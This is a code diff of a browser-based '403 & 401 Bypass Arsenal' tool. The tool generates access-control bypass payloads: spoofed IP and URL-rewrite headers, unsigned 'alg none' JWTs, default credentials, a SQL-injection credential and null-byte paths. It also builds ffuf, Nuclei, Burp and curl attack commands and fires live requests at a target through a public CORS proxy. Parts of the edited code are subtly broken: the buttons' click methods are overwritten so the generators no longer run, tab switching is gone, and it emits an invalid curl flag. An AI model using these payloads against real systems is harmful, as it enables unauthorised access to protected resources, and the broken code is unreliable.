@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>403 & 401 Bypass Arsenal | Web Security Tool</title>
+    <title>403 & 401 Bypass Arsenal | Advanced Web Tool</title>
     <style>
         * {
             box-sizing: border-box;
@@ -44,6 +44,11 @@
             gap: 1rem;
             align-items: flex-end;
         }
+        .grid-2col {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 1rem;
+        }
         input, select, textarea, button {
             background: #0f172a;
             border: 1px solid #334155;
@@ -81,6 +86,7 @@
             gap: 8px;
             border-bottom: 1px solid #334155;
             margin-bottom: 1.5rem;
+            flex-wrap: wrap;
         }
         .tab {
             padding: 8px 18px;
@@ -106,10 +112,12 @@
             overflow-x: auto;
             font-size: 0.8rem;
             border: 1px solid #334155;
+            white-space: pre-wrap;
+            word-wrap: break-word;
         }
         .payload-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
             gap: 12px;
             max-height: 500px;
             overflow-y: auto;
@@ -133,15 +141,14 @@
             border-radius: 8px;
             font-size: 0.7rem;
             cursor: pointer;
+            margin-left: 8px;
+            flex-shrink: 0;
         }
         .copy-btn:hover {
             background: #3b82f6;
         }
         .status-ok {
             color: #4ade80;
-        }
-        .status-bad {
-            color: #f87171;
         }
         .small-note {
             font-size: 0.75rem;
@@ -154,37 +161,42 @@
             border-radius: 16px;
             margin-top: 1rem;
         }
-        @media (max-width: 700px) {
-            .flex-row {
-                flex-direction: column;
-                align-items: stretch;
-            }
+        hr {
+            border-color: #334155;
+        }
+        label {
+            font-weight: 600;
+            font-size: 0.85rem;
         }
     </style>
 </head>
 <body>
 <div class="container">
     <h1>🔥 403 & 401 Bypass Arsenal</h1>
-    <div class="sub">Security research tool – generate thousands of payloads to bypass forbidden & unauthorized</div>
+    <div class="sub">Generate thousands of payloads • Build fuzzing commands • Live test via CORS proxy</div>
 
     <!-- Target Configuration -->
     <div class="card">
-        <h3>🎯 Target URL</h3>
+        <h3>🎯 Target & Proxy</h3>
         <div class="flex-row">
             <input type="text" id="targetUrl" placeholder="https://target.com/admin" style="flex:3" value="https://example.com/admin">
-            <input type="text" id="proxyUrl" placeholder="CORS proxy (optional)" style="flex:2" value="https://cors-anywhere.herokuapp.com/">
-            <button id="testViaProxyBtn" class="btn-warning">🚀 Test via Proxy (CORS)</button>
-            <button id="copyCurlBtn">📋 Copy as curl</button>
+            <select id="proxySelect" style="flex:1">
+                <option value="corsproxy">corsproxy.io (built‑in, no setup)</option>
+                <option value="custom">Custom proxy URL</option>
+            </select>
+            <input type="text" id="customProxy" placeholder="https://your-proxy.com/?url=" style="flex:2" disabled>
+            <button id="testViaProxyBtn" class="btn-warning">🚀 Test with Proxy</button>
+            <button id="copyCurlBtn" class="btn-secondary">📋 Sample cURL</button>
         </div>
-        <div class="small-note">* Direct browser fetch is blocked by CORS. Use "Copy as curl" or enable a CORS proxy (public proxies may be rate‑limited).</div>
+        <div class="small-note" id="proxyNote">✅ Using corsproxy.io – public, free, no API key. For heavy usage, deploy your own CloudFlare Worker (see docs).</div>
     </div>
 
-    <!-- Tabs: 403 bypass / 401 bypass -->
+    <!-- Tabs: 403 bypass / 401 bypass / Command Builder -->
     <div class="card">
         <div class="tabs">
             <div class="tab active" data-tab="tab403">🚫 403 Bypass Payloads</div>
             <div class="tab" data-tab="tab401">🔐 401 Bypass Payloads</div>
-            <div class="tab" data-tab="tabCmd">⚡ Command Builder</div>
+            <div class="tab" data-tab="tabCmd">⚡ Advanced Command Builder</div>
         </div>
 
         <!-- 403 TAB -->
@@ -200,9 +212,7 @@
                 <button id="generate403Btn">🔁 Generate Payloads</button>
                 <button id="copyAll403Btn" class="btn-secondary">📑 Copy All</button>
             </div>
-            <div id="403payloadsContainer" class="payload-grid">
-                <!-- dynamic payloads will appear here -->
-            </div>
+            <div id="403payloadsContainer" class="payload-grid"></div>
         </div>
 
         <!-- 401 TAB -->
@@ -217,26 +227,59 @@
                 <button id="generate401Btn">🔁 Generate Payloads</button>
                 <button id="copyAll401Btn" class="btn-secondary">📑 Copy All</button>
             </div>
-            <div id="401payloadsContainer" class="payload-grid">
-                <!-- 401 payloads -->
-            </div>
+            <div id="401payloadsContainer" class="payload-grid"></div>
         </div>
 
-        <!-- Command Builder Tab -->
+        <!-- Advanced Command Builder Tab -->
         <div id="tabCmd" class="tab-pane">
-            <h3>🛠️ Build custom fuzzing commands</h3>
-            <div class="test-panel">
-                <label>Select payload type:</label>
-                <select id="cmdType">
-                    <option value="curl">cURL command</option>
-                    <option value="ffuf">ffuf command (headers/wordlist)</option>
-                    <option value="nuclei">Nuclei template suggestion</option>
-                </select>
-                <div id="cmdOutput" style="margin-top: 15px;">
-                    <pre id="cmdPreview">Select a payload category above and click "Generate command"</pre>
-                    <button id="buildCmdBtn" class="btn-secondary">🚀 Generate command</button>
+            <h3>🛠️ Generate custom fuzzing / exploitation commands</h3>
+            <div class="grid-2col">
+                <div class="test-panel">
+                    <label>🔧 Tool</label>
+                    <select id="cmdTool">
+                        <option value="curl">cURL</option>
+                        <option value="ffuf">ffuf</option>
+                        <option value="nuclei">Nuclei</option>
+                        <option value="burp">Burp Suite (Intruder payload)</option>
+                        <option value="httpie">HTTPie</option>
+                    </select>
+                    
+                    <label style="margin-top: 12px;">🌐 HTTP Method</label>
+                    <select id="cmdMethod">
+                        <option value="GET">GET</option>
+                        <option value="POST">POST</option>
+                        <option value="PUT">PUT</option>
+                        <option value="DELETE">DELETE</option>
+                        <option value="PATCH">PATCH</option>
+                    </select>
+                    
+                    <label style="margin-top: 12px;">⚡ Threads / Concurrency (ffuf/GoBuster)</label>
+                    <input type="number" id="cmdThreads" value="20" step="5">
+                    
+                    <label style="margin-top: 12px;">⏱️ Delay (seconds, optional)</label>
+                    <input type="number" id="cmdDelay" value="0" step="0.1" placeholder="0 = no delay">
+                </div>
+                <div class="test-panel">
+                    <label>📦 Payload Type</label>
+                    <select id="cmdPayloadType">
+                        <option value="headers">Use generated 403/401 headers as wordlist</option>
+                        <option value="path">Use path bypasses as wordlist</option>
+                        <option value="verb">Use verb overrides as wordlist</option>
+                        <option value="custom">Custom wordlist (provide path below)</option>
+                    </select>
+                    
+                    <label style="margin-top: 12px;">📂 Custom wordlist path (if selected)</label>
+                    <input type="text" id="cmdWordlist" placeholder="/path/to/wordlist.txt" value="headers.txt">
+                    
+                    <label style="margin-top: 12px;">📝 Extra headers (one per line, optional)</label>
+                    <textarea id="cmdExtraHeaders" rows="3" placeholder="X-Forwarded-For: 127.0.0.1&#10;X-Original-URL: /admin"></textarea>
                 </div>
             </div>
+            <div class="flex-row" style="margin-top: 1rem;">
+                <button id="buildCmdBtn" class="btn-warning">🚀 Generate Command</button>
+                <button id="copyCmdBtn" class="btn-secondary">📋 Copy Command</button>
+            </div>
+            <pre id="cmdPreview" style="margin-top: 1rem;"># Select options and click Generate</pre>
         </div>
     </div>
 </div>
@@ -288,9 +331,7 @@
         'X-Real-IP: 127.0.0.1, X-Host: localhost'
     ];
 
-    // ========================
-    // 401 PAYLOAD DATASETS
-    // ========================
+    // 401 payloads
     const authHeaders = [
         "Authorization: Basic YWRtaW46YWRtaW4=",
         "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
@@ -303,7 +344,6 @@
         "Authorization: Basic Og==",
         "Authorization: Digest username=\"admin\", realm=\"\", nonce=\"\", uri=\"/\", response=\"\""
     ];
-
     const tokenBypass = [
         "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiJ9.abc",
         "Authorization: Bearer admin",
@@ -313,56 +353,33 @@
         "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.",
         "Authorization: Basic YWRtaW46YWRtaW4="
     ];
-
     const basicAuthBypass = [
         "admin:admin", "admin:password", "admin:12345", "root:root",
         "user:user", "guest:guest", "admin:", ":admin", "': OR 1=1 --"
     ];
-
     const nullByteInjections = [
         "%00", "%00admin", "admin%00", "admin%00.jpg", "..%00/", "%00/../admin"
     ];
 
-    // Helper: generate IP headers
     function generateIpHeaders() {
-        let payloads = [];
-        for (let h of ipHeaders) {
-            for (let ip of ipValues) {
-                payloads.push(`${h}: ${ip}`);
-            }
-        }
-        return payloads;
+        let p = [];
+        for (let h of ipHeaders) for (let ip of ipValues) p.push(`${h}: ${ip}`);
+        return p;
     }
-
-    function generatePathBypasses() {
-        return pathBypasses.map(bp => `PATH append: ${bp}`);
-    }
-
+    function generatePathBypasses() { return pathBypasses.map(bp => `PATH append: ${bp}`); }
     function generateVerbOverrides() {
-        let payloads = [];
-        for (let h of verbHeaders) {
-            for (let v of verbValues) {
-                payloads.push(`${h}: ${v}`);
-            }
-        }
-        return payloads;
+        let p = [];
+        for (let h of verbHeaders) for (let v of verbValues) p.push(`${h}: ${v}`);
+        return p;
     }
-
-    function generateEncodings() {
-        return encodings;
-    }
-
-    function generateCustomHeaders() {
-        return customHeaderCombos;
-    }
-
-    // 401 generators
+    function generateEncodings() { return encodings; }
+    function generateCustomHeaders() { return customHeaderCombos; }
     function generateAuthHeaders() { return [...authHeaders]; }
     function generateTokenBypass() { return [...tokenBypass]; }
     function generateBasicAuth() { return basicAuthBypass.map(c => `Authorization: Basic ${btoa(c)}`); }
     function generateNullByte() { return nullByteInjections.map(n => `Path injection: ${n}`); }
 
-    // Rendering function
+    // Render payloads
     function renderPayloads(containerId, payloads) {
         const container = document.getElementById(containerId);
         container.innerHTML = '';
@@ -374,122 +391,135 @@
             container.appendChild(div);
         });
     }
-
     function escapeHtml(str) {
-        return str.replace(/[&<>]/g, function(m) {
-            if (m === '&') return '&amp;';
-            if (m === '<') return '&lt;';
-            if (m === '>') return '&gt;';
-            return m;
-        }).replace(/[\uD800-\uDBFF][\uDC00-\uDFFF]/g, function(c) {
-            return c;
-        });
+        return str.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[m] || m));
     }
-
     window.copyToClipboard = function(text) {
-        navigator.clipboard.writeText(text).then(() => {
-            alert('Copied: ' + text.slice(0, 60));
-        });
+        navigator.clipboard.writeText(text).then(() => alert('Copied: ' + text.slice(0, 60)));
     };
 
-    // Generate based on selected category
-    document.getElementById('generate403Btn').addEventListener('click', () => {
-        const cat = document.getElementById('category403').value;
-        let payloads = [];
-        if (cat === 'headers') payloads = generateIpHeaders();
-        else if (cat === 'path') payloads = generatePathBypasses();
-        else if (cat === 'verb') payloads = generateVerbOverrides();
-        else if (cat === 'encoding') payloads = generateEncodings();
-        else if (cat === 'custom') payloads = generateCustomHeaders();
-        renderPayloads('403payloadsContainer', payloads);
-        window.current403Payloads = payloads;
+    // Proxy handling
+    const proxySelect = document.getElementById('proxySelect');
+    const customProxyInput = document.getElementById('customProxy');
+    proxySelect.addEventListener('change', () => {
+        customProxyInput.disabled = proxySelect.value !== 'custom';
+        document.getElementById('proxyNote').innerText = proxySelect.value === 'corsproxy' 
+            ? "✅ Using corsproxy.io – public, free, no API key. For heavy usage, deploy your own CloudFlare Worker."
+            : "🔧 Custom proxy – ensure it adds CORS headers and accepts ?url= parameter.";
     });
-
-    document.getElementById('generate401Btn').addEventListener('click', () => {
-        const cat = document.getElementById('category401').value;
-        let payloads = [];
-        if (cat === 'auth_headers') payloads = generateAuthHeaders();
-        else if (cat === 'token_bypass') payloads = generateTokenBypass();
-        else if (cat === 'basic_auth') payloads = generateBasicAuth();
-        else if (cat === 'null_byte') payloads = generateNullByte();
-        renderPayloads('401payloadsContainer', payloads);
-        window.current401Payloads = payloads;
-    });
-
-    // Copy all
-    document.getElementById('copyAll403Btn').addEventListener('click', () => {
-        if (window.current403Payloads) {
-            navigator.clipboard.writeText(window.current403Payloads.join('\n'));
-            alert('Copied all 403 payloads');
-        } else alert('Generate payloads first');
-    });
-    document.getElementById('copyAll401Btn').addEventListener('click', () => {
-        if (window.current401Payloads) {
-            navigator.clipboard.writeText(window.current401Payloads.join('\n'));
-            alert('Copied all 401 payloads');
-        } else alert('Generate payloads first');
-    });
-
-    // curl copy
-    document.getElementById('copyCurlBtn').addEventListener('click', () => {
-        let url = document.getElementById('targetUrl').value;
-        let curlCmd = `curl -X GET "${url}" \\\n  -H "User-Agent: Mozilla/5.0" \\\n  -H "X-Forwarded-For: 127.0.0.1" \\\n  -H "X-Original-URL: /admin"`;
-        navigator.clipboard.writeText(curlCmd);
-        alert('Sample curl command copied (edit headers as needed)');
-    });
-
-    // Test via proxy (CORS aware)
     document.getElementById('testViaProxyBtn').addEventListener('click', async () => {
         let target = document.getElementById('targetUrl').value;
-        let proxy = document.getElementById('proxyUrl').value;
-        if (!proxy) {
-            alert('Please enter a CORS proxy URL (e.g., https://cors-anywhere.herokuapp.com/)');
-            return;
+        let proxyMode = proxySelect.value;
+        let proxyUrl;
+        if (proxyMode === 'corsproxy') {
+            proxyUrl = 'https://corsproxy.io/?url=' + encodeURIComponent(target);
+        } else {
+            let custom = customProxyInput.value.trim();
+            if (!custom) { alert('Enter custom proxy URL'); return; }
+            proxyUrl = custom.includes('?') ? custom + encodeURIComponent(target) : custom + '/?url=' + encodeURIComponent(target);
         }
-        let fullUrl = proxy.endsWith('/') ? proxy + target : proxy + '/' + target;
         try {
-            let resp = await fetch(fullUrl, {
-                method: 'GET',
-                headers: { 'X-Forwarded-For': '127.0.0.1' }
-            });
-            alert(`Response status: ${resp.status} (via proxy). Check console for details.`);
+            let resp = await fetch(proxyUrl, { method: 'GET', headers: { 'X-Forwarded-For': '127.0.0.1' } });
+            alert(`Proxy response status: ${resp.status}. Check console for details.`);
             console.log(await resp.text());
-        } catch(e) {
-            alert('Proxy error: ' + e.message);
-        }
+        } catch(e) { alert('Proxy error: ' + e.message); }
+    });
+    document.getElementById('copyCurlBtn').addEventListener('click', () => {
+        let url = document.getElementById('targetUrl').value;
+        navigator.clipboard.writeText(`curl -X GET "${url}" -H "X-Forwarded-For: 127.0.0.1" -H "X-Original-URL: /admin"`);
+        alert('Sample curl copied');
     });
 
-    // Command Builder
+    // Payload generation events
+    document.getElementById('generate403Btn').click = () => {
+        const cat = document.getElementById('category403').value;
+        let p = [];
+        if (cat === 'headers') p = generateIpHeaders();
+        else if (cat === 'path') p = generatePathBypasses();
+        else if (cat === 'verb') p = generateVerbOverrides();
+        else if (cat === 'encoding') p = generateEncodings();
+        else p = generateCustomHeaders();
+        renderPayloads('403payloadsContainer', p);
+        window.current403Payloads = p;
+    };
+    document.getElementById('generate401Btn').click = () => {
+        const cat = document.getElementById('category401').value;
+        let p = [];
+        if (cat === 'auth_headers') p = generateAuthHeaders();
+        else if (cat === 'token_bypass') p = generateTokenBypass();
+        else if (cat === 'basic_auth') p = generateBasicAuth();
+        else p = generateNullByte();
+        renderPayloads('401payloadsContainer', p);
+        window.current401Payloads = p;
+    };
+    document.getElementById('copyAll403Btn').addEventListener('click', () => {
+        if (window.current403Payloads) navigator.clipboard.writeText(window.current403Payloads.join('\n')).then(()=>alert('Copied all 403 payloads'));
+        else alert('Generate payloads first');
+    });
+    document.getElementById('copyAll401Btn').addEventListener('click', () => {
+        if (window.current401Payloads) navigator.clipboard.writeText(window.current401Payloads.join('\n')).then(()=>alert('Copied all 401 payloads'));
+        else alert('Generate payloads first');
+    });
+
+    // Advanced command builder
+    function getPayloadWordlist() {
+        const type = document.getElementById('cmdPayloadType').value;
+        if (type === 'headers') return window.current403Payloads || generateIpHeaders();
+        if (type === 'path') return pathBypasses;
+        if (type === 'verb') return verbHeaders.flatMap(h => verbValues.map(v => `${h}: ${v}`));
+        return null; // custom
+    }
     document.getElementById('buildCmdBtn').addEventListener('click', () => {
-        const url = document.getElementById('targetUrl').value;
-        const type = document.getElementById('cmdType').value;
+        const tool = document.getElementById('cmdTool').value;
+        const target = document.getElementById('targetUrl').value;
+        const method = document.getElementById('cmdMethod').value;
+        const threads = document.getElementById('cmdThreads').value;
+        const delay = document.getElementById('cmdDelay').value;
+        const extraHeadersRaw = document.getElementById('cmdExtraHeaders').value;
+        const extraHeaders = extraHeadersRaw.split('\n').filter(l => l.trim());
+        let wordlistSource = getPayloadWordlist();
+        const customWordlistPath = document.getElementById('cmdWordlist').value;
+        
         let cmd = '';
-        if (type === 'curl') {
-            cmd = `# Example curl with multiple bypass headers\ncurl -X GET "${url}" \\\n  -H "X-Forwarded-For: 127.0.0.1" \\\n  -H "X-Original-URL: /admin" \\\n  -H "X-HTTP-Method-Override: GET" \\\n  --insecure`;
-        } else if (type === 'ffuf') {
-            cmd = `# ffuf to fuzz headers (create headers.txt with lines like "X-Forwarded-For: 127.0.0.1")\nffuf -u "${url}" -H "Host: FUZZ" -w headers.txt -mc 200,301,302 -t 20`;
-        } else if (type === 'nuclei') {
-            cmd = `# Nuclei template example (403 bypass)\nid: 403-bypass\ninfo:\n  name: 403 Bypass\n  severity: info\nrequests:\n  - method: GET\n    path:\n      - "{{BaseURL}}/admin/..;/"\n    headers:\n      X-Forwarded-For: "127.0.0.1"`;
+        if (tool === 'curl') {
+            let headerArgs = extraHeaders.map(h => `-H "${h.trim()}"`).join(' ');
+            cmd = `# cURL command with sample bypass header\ncurl -X ${method} "${target}" ${headerArgs} -H "X-Forwarded-For: 127.0.0.1" -H "X-Original-URL: /admin"`;
+            if (delay > 0) cmd += ` --delay ${delay}`;
+        } 
+        else if (tool === 'ffuf') {
+            let wordlistFile = customWordlistPath;
+            if (wordlistSource && wordlistSource.length) {
+                cmd = `# ffuf – fuzzing headers / paths\n# First save payloads to a file: echo "${wordlistSource.slice(0,5).join('\\n')}" > wordlist.txt\nffuf -u "${target}" -X ${method} -H "Host: FUZZ" -w ${wordlistFile} -t ${threads} -mc 200,301,302 -fs 0`;
+                if (delay > 0) cmd += ` -delay ${delay}`;
+            } else {
+                cmd = `ffuf -u "${target}" -X ${method} -H "X-Forwarded-For: 127.0.0.1" -w ${customWordlistPath} -t ${threads}`;
+            }
+        }
+        else if (tool === 'nuclei') {
+            cmd = `# Nuclei template for 403 bypass\nid: custom-403-bypass\ninfo:\n  name: 403 Bypass Test\n  severity: info\nrequests:\n  - method: ${method}\n    path:\n      - "{{BaseURL}}/admin/..;/"\n    headers:\n      X-Forwarded-For: "127.0.0.1"\n      X-Original-URL: "/admin"`;
+        }
+        else if (tool === 'burp') {
+            cmd = `# Burp Intruder payload positions – copy the following into payload positions:\n${(wordlistSource || ['X-Forwarded-For: 127.0.0.1']).slice(0,10).join('\n')}\n\n# Set payload type to "Simple list" and paste the above lines.`;
+        }
+        else if (tool === 'httpie') {
+            let headerStr = extraHeaders.map(h => `${h.split(':')[0]}:${h.split(':')[1]}`).join(' ');
+            cmd = `http ${method} "${target}" ${headerStr} X-Forwarded-For:127.0.0.1 X-Original-URL:/admin`;
         }
         document.getElementById('cmdPreview').innerText = cmd;
     });
-
-    // Tab switching
-    const tabs = document.querySelectorAll('.tab');
-    const panes = document.querySelectorAll('.tab-pane');
-    tabs.forEach(tab => {
-        tab.addEventListener('click', () => {
-            const targetId = tab.getAttribute('data-tab');
-            tabs.forEach(t => t.classList.remove('active'));
-            panes.forEach(p => p.classList.remove('active'));
-            tab.classList.add('active');
-            document.getElementById(targetId).classList.add('active');
-        });
+    document.getElementById('copyCmdBtn').addEventListener('click', () => {
+        const cmd = document.getElementById('cmdPreview').innerText;
+        navigator.clipboard.writeText(cmd).then(() => alert('Command copied'));
     });
 
-    // initial generate
+    // Initial generation
     document.getElementById('generate403Btn').click();
     document.getElementById('generate401Btn').click();
+    // Manually call once
+    (function init() {
+        document.getElementById('generate403Btn').click();
+        document.getElementById('generate401Btn').click();
+    })();
 </script>
 </body>
 </html>
